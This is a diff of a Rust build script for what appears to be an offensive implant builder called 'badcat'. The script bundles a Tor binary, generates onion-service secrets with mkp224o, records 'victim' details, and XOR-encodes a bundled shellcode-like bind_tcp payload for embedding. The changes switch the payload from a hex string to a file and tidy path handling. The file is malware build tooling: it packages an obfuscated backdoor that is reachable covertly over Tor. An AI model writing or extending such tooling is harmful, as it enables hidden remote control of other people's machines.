@@ -1,8 +1,8 @@
 use std::path::{Path, PathBuf};
+use std::io::{Read};
 use std::{collections, error, fs, process};
 
 use badcat_lib::{http, xor, secrets};
-use hex::FromHex;
 
 const CFG_TEMPLATE: &str = "config.rs.template";
 const CFG_DESTINATION: &str = "src/config.rs";
@@ -34,7 +34,7 @@ struct BuildSetting {
     linux_dir: String,
 
     /// Torrc file to bundle
-    torrc_file: String,
+    torrc_file: PathBuf,
 
     /// Executable name of tor in target machine
     tor_executable: String,
@@ -42,8 +42,8 @@ struct BuildSetting {
     /// Whether or not to use shellcode like payload
     uses_payload: bool,
 
-    /// Payload to execute. The supported payload is bind_tcp ones
-    payload_data: String,
+    /// Payload to file to bundle. The executable might start a tcp server
+    payload_file: PathBuf,
 
     /// If using a bind_tcp payload, what port the payload will listen
     payload_port: String,
@@ -57,7 +57,8 @@ fn main() -> Result<(), Box<dyn error::Error>> {
     let setting = parse_settings(&raw_settings);
     println!("cargo:rerun-if-changed={}", CFG_SETTINGS);
 
-    let mut torrc = fs::read_to_string(&setting.torrc_file)?;
+    let mut torrc = fs::read_to_string(&setting.torrc_file)
+        .expect("problem reading torrc file");
 
     let platform_tor_dir;
 
@@ -83,12 +84,13 @@ ControlSocket @{CTRL_SOCKET}
     replacements.insert("@{ENC_TOR_DIR}", enc_tor_dir);
 
     let enc_payload_data = if setting.uses_payload {
-        if &setting.payload_port == "" {
-            return Err(String::from("payload port is required").into());
-        }
+        let mut file = fs::File::open(&setting.payload_file)
+            .expect("problem reading payload file");
 
-        let bytes: Vec<u8> = Vec::from_hex(&setting.payload_data)?;
-        xor::encode_bytes(&setting.key, &bytes)
+        let mut buf = Vec::new();
+        file.read_to_end(&mut buf)?;
+
+        xor::encode_bytes(&setting.key, &buf)
     } else {
         String::from("")
     };
@@ -136,8 +138,8 @@ fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
         tmp_dir = download_and_extract_tor(&url, setting)?;
     }
 
-    let dir = tmp_dir.path().to_str().unwrap();
-    let hs_addr = generate_hs_secrets(dir)?;
+    let dir = tmp_dir.path();
+    let hs_addr = generate_hs_secrets(&dir)?;
 
     dump_victim(hs_addr, &setting)?;
 
@@ -168,7 +170,7 @@ fn dump_victim(address: String, setting: &BuildSetting) -> Result<(), Box<dyn er
     Ok(())
 }
 
-fn generate_hs_secrets(to_dir: &str) -> Result<String, Box<dyn error::Error>> {
+fn generate_hs_secrets(to_dir: &Path) -> Result<String, Box<dyn error::Error>> {
     let temp_dir = tempfile::tempdir()?;
 
     let proc = process::Command::new("mkp224o")
@@ -193,7 +195,7 @@ fn generate_hs_secrets(to_dir: &str) -> Result<String, Box<dyn error::Error>> {
     // mkp224o stores the files with this structure
     let secrets_dir = temp_dir.path().join(hs_addr);
 
-    let dir = Path::new(to_dir).join("App");
+    let dir = to_dir.join("App");
 
     fs::copy(secrets_dir.join("hostname"), dir.join("hostname"))?;
     fs::copy(
@@ -306,7 +308,7 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
         panic!("invalid linux destination directory");
     }));
 
-    let torrc_file = String::from(raw["tor"]["rc_file"].as_str().unwrap_or_else(|| {
+    let torrc_file = PathBuf::from(raw["tor"]["rc_file"].as_str().unwrap_or_else(|| {
         panic!("invalid torrc file");
     }));
 
@@ -316,15 +318,19 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
 
     let uses_payload = raw["payload"]["enabled"].as_bool().unwrap_or(false);
 
-    let payload_data = if uses_payload {
-        String::from(raw["payload"]["hex"].as_str().unwrap_or_else(|| {
+    let payload_file = if uses_payload {
+        PathBuf::from(raw["payload"]["file"].as_str().unwrap_or_else(|| {
             panic!("invalid payload setting")
         }))
     } else {
-        String::from("")
+        PathBuf::from("")
     };
 
     let payload_port = String::from(raw["payload"]["bind_port"].as_str().unwrap_or(""));
+
+    if payload_port.is_empty() {
+        panic!("payload port is required");
+    }
 
     BuildSetting {
         name,
@@ -338,7 +344,7 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
         torrc_file,
         tor_executable,
         uses_payload,
-        payload_data,
+        payload_file,
         payload_port,
     }
 }
